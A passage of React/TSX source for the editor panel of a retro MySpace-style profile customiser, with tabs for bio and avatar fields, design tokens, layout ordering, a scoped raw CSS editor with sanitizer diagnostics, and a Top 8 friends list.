              <span className="text-[10px] px-1.5 py-0.2 rounded bg-indigo-500/20 text-indigo-300 font-mono">
                {(profile.topFriends || []).length}
              </span>
            </button>

            <button
              type="button"
              onClick={() => setActiveTab('css')}
              className={`flex items-center gap-1.5 px-3 py-2.5 text-xs font-semibold rounded-t-lg transition-colors border-t-2 whitespace-nowrap cursor-pointer ${
                activeTab === 'css'
                  ? 'border-blue-500 bg-slate-800/90 text-white'
                  : 'border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
              }`}
            >
              <Code2 className="w-3.5 h-3.5 text-pink-400" />
              Raw CSS
              {cssAudit.violations.length > 0 && (
                <span className="w-2 h-2 rounded-full bg-amber-400"></span>
              )}
            </button>
          </div>

          {/* Left Pane Scrollable Content */}
          <div className="flex-1 overflow-y-auto p-4 space-y-6">
            {/* TAB 0: PROFILE INFO & AVATAR */}
            {activeTab === 'profile' && (
              <div className="space-y-5">
                <div className="p-4 rounded-xl bg-slate-800/60 border border-slate-700/80 space-y-4">
                  <h3 className="text-xs font-bold font-mono uppercase tracking-wider text-slate-300 flex items-center gap-2">
                    <User className="w-4 h-4 text-emerald-400" />
                    Identity &amp; Bio Information
                  </h3>

                  {/* Avatar Section */}
                  <div className="space-y-2">
                    <label className="text-xs font-semibold text-slate-300">Profile Picture / Avatar</label>
                    <div className="flex items-start gap-3">
                      {/* eslint-disable-next-line @next/next/no-img-element */}
                      <img
                        src={profile.avatarUrl || 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=80'}
                        alt="Avatar Preview"
                        className="w-16 h-16 rounded-xl object-cover border-2 border-emerald-500/50 shadow-md bg-slate-900 flex-shrink-0"
                      />
                      <div className="flex-1 space-y-1.5">
                        <input
                          type="text"
                          value={profile.avatarUrl}
                          onChange={(e) => setProfile(prev => ({ ...prev, avatarUrl: e.target.value }))}
                          placeholder="/avatars/kevin.jpg or https://..."
                          className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white font-mono focus:outline-none focus:border-blue-500"
                        />
                        <div className="flex flex-wrap gap-1.5 pt-1">
                          <button
                            type="button"
                            onClick={() => setProfile(prev => ({ ...prev, avatarUrl: 'https://github.com/kevingkday.png' }))}
                            className="text-[10px] px-2 py-0.5 rounded bg-slate-700 hover:bg-slate-600 text-slate-200 transition-colors cursor-pointer"
                          >
                            Use GitHub Avatar
                          </button>
                          <button
                            type="button"
                            onClick={() => setProfile(prev => ({ ...prev, avatarUrl: '/avatars/glitterqueen.jpg' }))}
                            className="text-[10px] px-2 py-0.5 rounded bg-slate-700 hover:bg-slate-600 text-slate-200 transition-colors cursor-pointer"
                          >
                            Use Scene Queen
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Display Name */}
                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Display Name</label>
                    <input
                      type="text"
                      value={profile.displayName}
                      onChange={(e) => setProfile(prev => ({ ...prev, displayName: e.target.value }))}
                      className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white focus:outline-none focus:border-blue-500"
                    />
                  </div>

                  {/* Headline & Mood */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-300">Headline</label>
                      <input
                        type="text"
                        value={profile.headline}
                        onChange={(e) => setProfile(prev => ({ ...prev, headline: e.target.value }))}
                        className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white focus:outline-none focus:border-blue-500"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-300">Mood</label>
                      <input
                        type="text"
                        value={profile.mood}
                        onChange={(e) => setProfile(prev => ({ ...prev, mood: e.target.value }))}
                        className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white focus:outline-none focus:border-blue-500"
                      />
                    </div>
                  </div>

                  {/* Tagline */}
                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Tagline</label>
                    <input
                      type="text"
                      value={profile.tagline}
                      onChange={(e) => setProfile(prev => ({ ...prev, tagline: e.target.value }))}
                      className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white focus:outline-none focus:border-blue-500"
                    />
                  </div>

                  {/* Banner Image URL */}
                  <div className="space-y-1">
                    <label className="text-xs font-semibold text-slate-300">Banner Background URL</label>
                    <input
                      type="text"
                      value={profile.bannerUrl || ''}
                      onChange={(e) => setProfile(prev => ({ ...prev, bannerUrl: e.target.value }))}
                      placeholder="https://images.unsplash.com/..."
                      className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white font-mono focus:outline-none focus:border-blue-500"
                    />
                  </div>
                </div>

                {/* Profile Soundtrack Info */}
                <div className="p-4 rounded-xl bg-slate-800/60 border border-slate-700/80 space-y-3">
                  <h3 className="text-xs font-bold font-mono uppercase tracking-wider text-slate-300 flex items-center gap-2">
                    <Music className="w-4 h-4 text-cyan-400" />
                    Profile Soundtrack Track
                  </h3>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-300">Song Title</label>
                      <input
                        type="text"
                        value={profile.songTitle}
                        onChange={(e) => setProfile(prev => ({ ...prev, songTitle: e.target.value }))}
                        className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white focus:outline-none focus:border-blue-500"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs font-semibold text-slate-300">Song Artist</label>
                      <input
                        type="text"
                        value={profile.songArtist}
                        onChange={(e) => setProfile(prev => ({ ...prev, songArtist: e.target.value }))}
                        className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white focus:outline-none focus:border-blue-500"
                      />
                    </div>
                  </div>
                </div>

                {/* Profile Security & Password */}
                <div className="p-4 rounded-xl bg-slate-800/60 border border-slate-700/80 space-y-3">
                  <h3 className="text-xs font-bold font-mono uppercase tracking-wider text-slate-300 flex items-center gap-2">
                    <KeyRound className="w-4 h-4 text-amber-400" />
                    Profile Security &amp; Password
                  </h3>
                  <div className="space-y-1.5">
                    <label className="text-xs font-semibold text-slate-300">Set New Password</label>
                    <input
                      type="password"
                      value={newPassword}
                      onChange={(e) => setNewPassword(e.target.value)}
                      placeholder="Leave blank to keep current password"
                      className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white font-mono focus:outline-none focus:border-blue-500"
                    />
                    <p className="text-[10px] text-slate-400">
                      Default demo password is <code className="text-amber-300 font-bold">teramee2026</code>. Enter a new password here and click Save Profile to update it.
                    </p>
                    {passwordChangeSuccess && (
                      <p className="text-xs text-emerald-400 font-semibold flex items-center gap-1">
                        <Check className="w-3.5 h-3.5" />
                        Password updated successfully!
                      </p>
                    )}
                  </div>
                </div>

                {/* Profile Blurbs & Story (About Me, Who I'd Like to Meet, Interests) */}
                <div className="p-4 rounded-xl bg-slate-800/60 border border-slate-700/80 space-y-4">
                  <div className="flex items-center justify-between">
                    <h3 className="text-xs font-bold font-mono uppercase tracking-wider text-slate-300 flex items-center gap-2">
                      <Sparkles className="w-4 h-4 text-pink-400" />
                      Blurbs &amp; Story (MySpace Classic)
                    </h3>
                    <span className="text-[10px] text-slate-400 font-mono">HTML Supported</span>
                  </div>

                  {/* About Me Blurb */}
                  <div className="space-y-1.5">
                    <div className="flex items-center justify-between">
                      <label className="text-xs font-semibold text-slate-300">About Me Blurb</label>
                      <div className="flex gap-1 text-[10px]">
                        <button
                          type="button"
                          onClick={() => setProfile(prev => ({ ...prev, bioHtml: (prev.bioHtml || '') + '<b>Bold Text</b>' }))}
                          className="px-1.5 py-0.5 rounded bg-slate-700 hover:bg-slate-600 text-slate-300 cursor-pointer"
                        >
                          &lt;b&gt;
                        </button>
                        <button
                          type="button"
                          onClick={() => setProfile(prev => ({ ...prev, bioHtml: (prev.bioHtml || '') + '<i>Italic</i>' }))}
                          className="px-1.5 py-0.5 rounded bg-slate-700 hover:bg-slate-600 text-slate-300 cursor-pointer"
                        >
                          &lt;i&gt;
                        </button>
                        <button
                          type="button"
                          onClick={() => setProfile(prev => ({ ...prev, bioHtml: (prev.bioHtml || '') + '<marquee scrollamount="4">Sparkles</marquee>' }))}
                          className="px-1.5 py-0.5 rounded bg-slate-700 hover:bg-slate-600 text-slate-300 cursor-pointer"
                        >
                          &lt;marquee&gt;
                        </button>
                      </div>
                    </div>
                    <textarea
                      rows={4}
                      value={profile.bioHtml}
                      onChange={(e) => setProfile(prev => ({ ...prev, bioHtml: e.target.value }))}
                      placeholder="Tell the world who you are... (HTML tags like <b>, <i>, <p>, <marquee> allowed!)"
                      className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white font-mono focus:outline-none focus:border-blue-500 leading-relaxed"
                    />
                  </div>

                  {/* Who I'd Like to Meet Blurb */}
                  <div className="space-y-1.5">
                    <label className="text-xs font-semibold text-slate-300">Who I&apos;d Like to Meet</label>
                    <textarea
                      rows={3}
                      value={profile.whoIdLikeToMeetHtml || ''}
                      onChange={(e) => setProfile(prev => ({ ...prev, whoIdLikeToMeetHtml: e.target.value }))}
                      placeholder="Describe the friends, bands, or creators you want to connect with..."
                      className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white font-mono focus:outline-none focus:border-blue-500 leading-relaxed"
                    />
                  </div>

                  {/* Interests & Details Blurb */}
                  <div className="space-y-1.5">
                    <label className="text-xs font-semibold text-slate-300">Interests &amp; Details</label>
                    <textarea
                      rows={3}
                      value={profile.interestsHtml}
                      onChange={(e) => setProfile(prev => ({ ...prev, interestsHtml: e.target.value }))}
                      placeholder="Favorite bands, movies, books, and hobbies..."
                      className="w-full px-3 py-2 text-xs bg-slate-900 border border-slate-700 rounded-lg text-white font-mono focus:outline-none focus:border-blue-500 leading-relaxed"
                    />
                  </div>
                </div>
              </div>
            )}

            {/* TAB 1: DESIGN TOKENS */}
            {activeTab === 'tokens' && (
              <div className="space-y-6">
                {/* Colors Section */}
                <div className="space-y-3">
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <Palette className="w-3.5 h-3.5 text-blue-400" />
                    Color Palette
                  </h3>

                  <div className="grid grid-cols-2 gap-3">
                    {/* Background Color */}
                    <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60">
                      <label className="block text-xs font-medium text-slate-300 mb-1.5">
                        Background Canvas
                      </label>
                      <div className="flex items-center gap-2">
                        <input
                          type="color"
                          value={profile.tokens.backgroundColor}
                          onChange={(e) => updateToken('backgroundColor', e.target.value)}
                          className="w-8 h-8 rounded border-none cursor-pointer bg-transparent"
                        />
                        <input
                          type="text"
                          value={profile.tokens.backgroundColor}
                          onChange={(e) => updateToken('backgroundColor', e.target.value)}
                          className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                        />
                      </div>
                    </div>

                    {/* Card Container Color */}
                    <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60">
                      <label className="block text-xs font-medium text-slate-300 mb-1.5">
                        Profile Card Color
                      </label>
                      <div className="flex items-center gap-2">
                        <input
                          type="color"
                          value={profile.tokens.cardColor}
                          onChange={(e) => updateToken('cardColor', e.target.value)}
                          className="w-8 h-8 rounded border-none cursor-pointer bg-transparent"
                        />
                        <input
                          type="text"
                          value={profile.tokens.cardColor}
                          onChange={(e) => updateToken('cardColor', e.target.value)}
                          className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                        />
                      </div>
                    </div>

                    {/* Accent Highlight Color */}
                    <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60">
                      <label className="block text-xs font-medium text-slate-300 mb-1.5">
                        Accent / Links
                      </label>
                      <div className="flex items-center gap-2">
                        <input
                          type="color"
                          value={profile.tokens.accentColor}
                          onChange={(e) => updateToken('accentColor', e.target.value)}
                          className="w-8 h-8 rounded border-none cursor-pointer bg-transparent"
                        />
                        <input
                          type="text"
                          value={profile.tokens.accentColor}
                          onChange={(e) => updateToken('accentColor', e.target.value)}
                          className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                        />
                      </div>
                    </div>

                    {/* Header Text Color */}
                    <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60">
                      <label className="block text-xs font-medium text-slate-300 mb-1.5">
                        Header Titles
                      </label>
                      <div className="flex items-center gap-2">
                        <input
                          type="color"
                          value={profile.tokens.headerColor}
                          onChange={(e) => updateToken('headerColor', e.target.value)}
                          className="w-8 h-8 rounded border-none cursor-pointer bg-transparent"
                        />
                        <input
                          type="text"
                          value={profile.tokens.headerColor}
                          onChange={(e) => updateToken('headerColor', e.target.value)}
                          className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* Background Pattern Section */}
                <div className="space-y-3">
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <Sparkles className="w-3.5 h-3.5 text-pink-400" />
                    Retro Background Pattern
                  </h3>

                  <div className="grid grid-cols-3 gap-2">
                    {[
                      { id: 'none', label: 'Solid Clean' },
                      { id: 'stars', label: 'Starfield ✨' },
                      { id: 'glitter', label: 'Scene Glitter 💖' },
                      { id: 'scanlines', label: 'CRT Scanlines 📺' },
                      { id: 'retro-grid', label: 'Synthwave Grid 🌐' }
                    ].map((pat) => (
                      <button
                        key={pat.id}
                        type="button"
                        onClick={() => updateToken('backgroundPattern', pat.id as any)}
                        className={`p-2.5 rounded-lg border text-xs font-medium text-center transition-all ${
                          profile.tokens.backgroundPattern === pat.id
                            ? 'bg-blue-600/30 border-blue-500 text-white shadow-sm'
                            : 'bg-slate-800/60 border-slate-700 text-slate-300 hover:bg-slate-800 hover:text-white'
                        }`}
                      >
                        {pat.label}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Typography & Font Section */}
                <div className="space-y-3">
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <Type className="w-3.5 h-3.5 text-purple-400" />
                    Typography & Fonts
                  </h3>

                  <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60 space-y-3">
                    <div>
                      <label className="block text-xs font-medium text-slate-300 mb-1">
                        Font Family
                      </label>
                      <select
                        value={profile.tokens.fontFamily}
                        onChange={(e) => updateToken('fontFamily', e.target.value)}
                        className="w-full text-xs p-2 rounded bg-slate-900 border border-slate-700 text-slate-200 focus:outline-none focus:border-blue-500"
                      >
                        <option value="Trebuchet MS, sans-serif">Trebuchet MS (Classic MySpace)</option>
                        <option value='"Comic Sans MS", cursive, sans-serif'>Comic Sans MS (Scene 2007)</option>
                        <option value='"Courier New", Courier, monospace'>Courier New (Cyberpunk Terminal)</option>
                        <option value="Georgia, serif">Georgia (Gothic Melancholy)</option>
                        <option value="Impact, fantasy">Impact (Bold Statement)</option>
                        <option value="Inter, sans-serif">Inter (Modern Clean)</option>
                      </select>
                    </div>

                    <div>
                      <label className="block text-xs font-medium text-slate-300 mb-1">
                        Text Content Color
                      </label>
                      <div className="flex items-center gap-2">
                        <input
                          type="color"
                          value={profile.tokens.textColor}
                          onChange={(e) => updateToken('textColor', e.target.value)}
                          className="w-8 h-8 rounded border-none cursor-pointer bg-transparent"
                        />
                        <input
                          type="text"
                          value={profile.tokens.textColor}
                          onChange={(e) => updateToken('textColor', e.target.value)}
                          className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* Border & Styling Section */}
                <div className="space-y-3">
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <Square className="w-3.5 h-3.5 text-amber-400" />
                    Card Borders & Corners
                  </h3>

                  <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60 space-y-4">
                    {/* Border Radius */}
                    <div>
                      <div className="flex justify-between text-xs mb-1">
                        <span className="font-medium text-slate-300">Border Radius</span>
                        <span className="font-mono text-slate-400">{profile.tokens.borderRadius}</span>
                      </div>
                      <input
                        type="range"
                        min="0"
                        max="24"
                        step="2"
                        value={parseInt(profile.tokens.borderRadius, 10) || 0}
                        onChange={(e) => updateToken('borderRadius', `${e.target.value}px`)}
                        className="w-full accent-blue-500 cursor-pointer"
                      />
                    </div>

                    {/* Border Style */}
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-xs font-medium text-slate-300 mb-1">
                          Border Style
                        </label>
                        <select
                          value={profile.tokens.borderStyle}
                          onChange={(e) => updateToken('borderStyle', e.target.value as any)}
                          className="w-full text-xs p-2 rounded bg-slate-900 border border-slate-700 text-slate-200 focus:outline-none"
                        >
                          <option value="solid">Solid</option>
                          <option value="dashed">Dashed</option>
                          <option value="dotted">Dotted</option>
                          <option value="double">Double</option>
                          <option value="groove">Groove</option>
                        </select>
                      </div>

                      <div>
                        <label className="block text-xs font-medium text-slate-300 mb-1">
                          Border Color
                        </label>
                        <div className="flex items-center gap-1.5">
                          <input
                            type="color"
                            value={profile.tokens.borderColor}
                            onChange={(e) => updateToken('borderColor', e.target.value)}
                            className="w-7 h-7 rounded border-none cursor-pointer bg-transparent"
                          />
                          <input
                            type="text"
                            value={profile.tokens.borderColor}
                            onChange={(e) => updateToken('borderColor', e.target.value)}
                            className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                          />
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* TAB 2: MODULAR LAYOUT BLOCKS */}
            {activeTab === 'layout' && (
              <div className="space-y-4">
                <div className="p-3 bg-blue-500/10 border border-blue-500/30 rounded-xl text-xs text-blue-300">
                  <p className="font-semibold mb-0.5">Modular Column Ordering:</p>
                  <p className="opacity-90">
                    Organize your profile blocks between the Left column (Bio/Details) and Right column (Jukebox/Top 8/Guestbook).
                  </p>
                </div>

                <div className="space-y-2.5">
                  {profile.layout.map((block, idx) => (
                    <div
                      key={block.id}
                      className="p-3 rounded-xl border border-slate-700/80 bg-slate-800/80 flex items-center justify-between gap-3 transition-colors hover:border-slate-600"
                    >
                      <div className="flex items-center gap-3">
                        <button
                          type="button"
                          onClick={() => toggleBlockVisibility(block.id)}
                          className={`w-5 h-5 rounded flex items-center justify-center transition-colors ${
                            block.visible
                              ? 'bg-blue-600 text-white'
                              : 'bg-slate-700 text-slate-500'
                          }`}
                        >
                          <Eye className="w-3 h-3" />
                        </button>
                        <div>
                          <p className="text-xs font-bold text-slate-200">
                            {block.title}
                          </p>
                          <span className="text-[10px] font-mono px-1.5 py-0.2 rounded bg-slate-900 text-slate-400">
                            Column: {block.column.toUpperCase()}
                          </span>
                        </div>
                      </div>

                      <div className="flex items-center gap-1.5">
                        {/* Toggle Column */}
                        <button
                          type="button"
                          onClick={() => toggleBlockColumn(block.id)}
                          className="px-2 py-1 rounded text-xs bg-slate-700 hover:bg-slate-600 text-slate-200 flex items-center gap-1"
                          title="Switch between Left and Right column"
                        >
                          <Columns className="w-3 h-3" />
                          <span>{block.column === 'left' ? 'Move Right' : 'Move Left'}</span>
                        </button>

                        {/* Move Up/Down */}
                        <button
                          type="button"
                          disabled={idx === 0}
                          onClick={() => moveBlock(idx, 'up')}
                          className="p-1 rounded bg-slate-700 hover:bg-slate-600 text-slate-200 disabled:opacity-30"
                        >
                          <ArrowUp className="w-3 h-3" />
                        </button>
                        <button
                          type="button"
                          disabled={idx === profile.layout.length - 1}
                          onClick={() => moveBlock(idx, 'down')}
                          className="p-1 rounded bg-slate-700 hover:bg-slate-600 text-slate-200 disabled:opacity-30"
                        >
                          <ArrowDown className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* TAB 3: POWER USER SCOPED CSS */}
            {activeTab === 'css' && (
              <div className="space-y-4">
                <div className="flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2">
                    <span className="font-bold text-slate-300">Raw CSS Editor</span>
                    <span className="text-[10px] px-2 py-0.5 rounded-full bg-pink-500/20 text-pink-300 font-mono border border-pink-500/30">
                      Auto-Scoped to .profile-canvas
                    </span>
                  </div>

                  <button
                    type="button"
                    onClick={() => setShowTransformedCss(!showTransformedCss)}
                    className="text-xs text-blue-400 hover:text-blue-300 underline font-mono flex items-center gap-1"
                  >
                    {showTransformedCss ? 'Hide Transformed AST' : 'View Transformed AST'}
                  </button>
                </div>

                {/* Code Textarea with line numbers vibe */}
                <div className="relative rounded-xl border border-slate-700 overflow-hidden bg-slate-950 font-mono text-xs shadow-inner">
                  <textarea
                    rows={12}
                    value={profile.rawCss || ''}
                    onChange={(e) =>
                      setProfile((prev) => ({ ...prev, rawCss: e.target.value }))
                    }
                    placeholder="Enter custom CSS rules here (e.g. .profile-card { border: 2px dashed red; })"
                    spellCheck={false}
                    className="w-full p-3 bg-transparent text-emerald-400 placeholder:text-slate-600 focus:outline-none resize-y leading-relaxed font-mono"
                  />
                </div>

                {/* Transformed AST Scoped Output Accordion */}
                {showTransformedCss && (
                  <div className="p-3 rounded-xl border border-slate-700/80 bg-slate-900/90 space-y-2">
                    <p className="text-xs font-bold text-slate-300 flex items-center justify-between">
                      <span>Transformed & Scoped Output:</span>
                      <span className="font-mono text-[10px] text-emerald-400">
                        {cssAudit.stats.scopedRuleCount} rules scoped
                      </span>
                    </p>
                    <pre className="p-2.5 rounded bg-black/60 text-[11px] font-mono text-slate-300 overflow-x-auto whitespace-pre-wrap max-h-36">
                      {cssAudit.sanitizedCss || '/* Empty CSS */'}
                    </pre>
                  </div>
                )}

                {/* Real-time AST Sanitization Diagnostics Panel */}
                <div className="p-3.5 rounded-xl border border-slate-700/80 bg-slate-800/70 space-y-3">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      {cssAudit.violations.some((v) => v.severity === 'critical') ? (
                        <ShieldAlert className="w-4 h-4 text-red-400" />
                      ) : (
                        <ShieldCheck className="w-4 h-4 text-emerald-400" />
                      )}
                      <span className="text-xs font-bold text-slate-200">
                        CSS AST Sanitizer Pipeline
                      </span>
                    </div>

                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 text-slate-400">
                      Rules: {cssAudit.stats.ruleCount} | Scoped: {cssAudit.stats.scopedRuleCount} | Stripped: {cssAudit.stats.strippedRuleCount}
                    </span>
                  </div>

                  {/* Violations / Audit Messages List */}
                  {cssAudit.violations.length === 0 ? (
                    <div className="flex items-center gap-2 text-xs text-emerald-400 bg-emerald-500/10 p-2.5 rounded-lg border border-emerald-500/20">
                      <Check className="w-3.5 h-3.5" />
                      <span>AST Clean: No malicious rules or unapproved directives detected.</span>
                    </div>
                  ) : (
                    <div className="space-y-1.5 max-h-40 overflow-y-auto pr-1">
                      {cssAudit.violations.map((violation, i) => (
                        <div
                          key={i}
                          className={`p-2 rounded text-[11px] flex items-start gap-2 border ${
                            violation.severity === 'critical'
                              ? 'bg-red-500/10 border-red-500/30 text-red-300'
                              : violation.severity === 'warning'
                              ? 'bg-amber-500/10 border-amber-500/30 text-amber-300'
                              : 'bg-blue-500/10 border-blue-500/30 text-blue-300'
                          }`}
                        >
                          <AlertTriangle className="w-3.5 h-3.5 flex-shrink-0 mt-0.5" />
                          <div className="flex-1 min-w-0">
                            <p className="font-semibold">{violation.message}</p>
                            {violation.originalSnippet && (
                              <code className="block mt-0.5 text-[10px] font-mono opacity-80 truncate">
                                {violation.originalSnippet}
                              </code>
                            )}
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* TAB 4: TOP 8 FRIENDS SQUAD */}
            {activeTab === 'friends' && (
              <div className="space-y-5">
                <div className="p-4 rounded-xl bg-slate-800/60 border border-slate-700/80 space-y-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <h3 className="text-xs font-bold font-mono uppercase tracking-wider text-slate-300 flex items-center gap-2">
                        <Users className="w-4 h-4 text-purple-400" />
                        Top 8 Friends Squad
                      </h3>
                      <p className="text-[11px] text-slate-400 mt-0.5">
                        Customize who appears in your profile Top 8 and their rankings!
                      </p>
                    </div>
                    <button
                      type="button"
                      onClick={handleAddTopFriend}
                      disabled={(profile.topFriends || []).length >= 8}
                      className="px-3 py-1.5 text-xs font-semibold rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white flex items-center gap-1.5 transition-all shadow-sm active:scale-95 disabled:opacity-40 cursor-pointer"
                    >
                      <Plus className="w-3.5 h-3.5" />
                      <span>Add Friend</span>
                    </button>
                  </div>

                  {/* Friends Quick Presets */}
                  <div className="p-3 rounded-xl bg-slate-950/60 border border-slate-800 text-xs space-y-2">
                    <span className="text-[11px] font-semibold text-slate-400">Quick-Add Community Presets:</span>
                    <div className="flex flex-wrap gap-1.5">
                      {[
                        { name: 'Kevin', avatarUrl: 'https://github.com/kevingkday.png', role: 'Teramee Creator' },
                        { name: 'Glitter Queen', avatarUrl: '/avatars/glitterqueen.jpg', role: 'Scene Queen' },
                        { name: 'Sarah', avatarUrl: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=200&auto=format&fit=crop&q=80', role: 'BFFL' },
                        { name: 'Alex', avatarUrl: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=200&auto=format&fit=crop&q=80', role: 'Bassist' },
                        { name: 'Maya', avatarUrl: 'https://images.unsplash.com/photo-1517841905240-472988babdf9?w=200&auto=format&fit=crop&q=80', role: 'Designer' },
                        { name: 'Jordan', avatarUrl: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=200&auto=format&fit=crop&q=80', role: 'DJ' }
                      ].map((preset, i) => (
                        <button
                          key={i}
                          type="button"
                          onClick={() => {
                            if ((profile.topFriends || []).length >= 8) return;
                            setProfile((prev) => ({
                              ...prev,
                              topFriends: [
                                ...(prev.topFriends || []),
                                {
                                  id: `f_${Date.now()}_${i}`,
                                  name: preset.name,
                                  avatarUrl: preset.avatarUrl,
                                  role: preset.role,
                                  status: 'online'
                                }
                              ]
                            }));
                          }}
                          disabled={(profile.topFriends || []).length >= 8}
                          className="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-[11px] text-slate-200 border border-slate-700/60 transition-colors flex items-center gap-1 cursor-pointer disabled:opacity-40"
                        >
                          <span>+</span>
                          <span>{preset.name}</span>
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Top Friends List */}
                  <div className="space-y-3">
                    {(profile.topFriends || []).length === 0 ? (
                      <div className="text-center py-6 text-slate-500 text-xs">
                        No friends in your Top 8 yet. Click &quot;Add Friend&quot; or choose a preset above!
                      </div>
                    ) : (
                      (profile.topFriends || []).map((friend, idx) => (
                        <div
                          key={friend.id || idx}
                          className="p-3 rounded-xl bg-slate-900 border border-slate-800 flex flex-col sm:flex-row items-start sm:items-center gap-3 transition-all hover:border-slate-700"
                        >
                          {/* Rank badge & Avatar */}
                          <div className="flex items-center gap-2.5 flex-shrink-0">
                            <span className="w-6 h-6 rounded-lg bg-indigo-600/30 border border-indigo-500/40 text-indigo-300 font-bold text-xs flex items-center justify-center font-mono">
                              #{idx + 1}
                            </span>
                            {/* eslint-disable-next-line @next/next/no-img-element */}
                            <img
                              src={friend.avatarUrl || 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=80'}
                              alt={friend.name}
                              className="w-10 h-10 rounded-lg object-cover border border-slate-700"
                            />
                          </div>

                          {/* Friend details inputs */}
                          <div className="flex-1 grid grid-cols-1 sm:grid-cols-3 gap-2 w-full">
                            <input
                              type="text"
                              value={friend.name}
                              onChange={(e) => handleUpdateFriend(idx, { name: e.target.value })}
                              placeholder="Friend's Name"
                              className="px-2.5 py-1.5 text-xs bg-slate-950 border border-slate-700 rounded-lg text-white focus:outline-none focus:border-indigo-500"
                            />
                            <input
                              type="text"
                              value={friend.role}
                              onChange={(e) => handleUpdateFriend(idx, { role: e.target.value })}
                              placeholder="Role (e.g. BFFL)"
                              className="px-2.5 py-1.5 text-xs bg-slate-950 border border-slate-700 rounded-lg text-white focus:outline-none focus:border-indigo-500"
                            />
                            <input
                              type="text"
                              value={friend.avatarUrl}
                              onChange={(e) => handleUpdateFriend(idx, { avatarUrl: e.target.value })}
                              placeholder="Avatar URL"
                              className="px-2.5 py-1.5 text-xs bg-slate-950 border border-slate-700 rounded-lg text-white font-mono focus:outline-none focus:border-indigo-500"
                            />
                          </div>

                          {/* Reorder and Delete Actions */}
                          <div className="flex items-center gap-1 self-end sm:self-center">
                            <button
                              type="button"
                              onClick={() => handleMoveFriend(idx, 'up')}
                              disabled={idx === 0}
                              title="Move Up in Top 8"
                              className="p-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 disabled:opacity-30 cursor-pointer"
                            >
                              <ArrowUp className="w-3.5 h-3.5" />
                            </button>
                            <button
                              type="button"
                              onClick={() => handleMoveFriend(idx, 'down')}
                              disabled={idx === (profile.topFriends || []).length - 1}
                              title="Move Down in Top 8"
                              className="p-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 disabled:opacity-30 cursor-pointer"
                            >
                              <ArrowDown className="w-3.5 h-3.5" />
                            </button>
                            <button
                              type="button"
                              onClick={() => handleDeleteFriend(idx)}
                              title="Remove from Top 8"
                              className="p-1.5 rounded bg-red-950/40 hover:bg-red-900/60 border border-red-800/40 text-red-400 cursor-pointer"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </button>
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </div>
